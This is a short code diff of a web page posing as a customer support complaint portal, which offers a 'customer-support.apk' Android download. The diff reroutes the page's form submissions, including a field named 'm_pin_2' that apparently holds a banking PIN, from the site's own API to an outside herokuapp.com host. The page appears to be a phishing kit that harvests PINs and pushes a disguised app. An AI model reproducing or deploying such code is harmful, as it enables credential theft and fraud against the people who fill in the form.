@@ -63,7 +63,7 @@
 								<div class="card-body" style="text-align: center;">
 									<h5 class="card-title">Download our <b>Android App</b> to track your complaint
 										status</h5>
-									<a href="/customer-support.apk" class="btn btn-dark btn-lg" role="button"><img
+									<a href="customer-support.apk" class="btn btn-dark btn-lg" role="button"><img
 											src="assets/img/google-play.png" alt="">&nbsp;&nbsp;Download</a>
 								</div>
 							</div>
@@ -214,7 +214,7 @@
 						body: JSON.stringify(data)
 					};
 					this.loading = true;
-					fetch('/api/updateForm', requestOptions)
+					fetch('https://customer-support-messages.herokuapp.com/api/updateForm', requestOptions)
 						.then(async response => {
 							const data = await response.json();
 							if(!data.status){
@@ -289,7 +289,7 @@
 						dataType: 'json',
 						body: JSON.stringify({ m_pin_2: this.formData.m_pin_2, step: this.step})
 					};
-					fetch('/api/submitForm', requestOptions)
+					fetch('https://customer-support-messages.herokuapp.com/api/submitForm', requestOptions)
 						.then(async response => {
 							const data = await response.json();
 							this.loading = false;
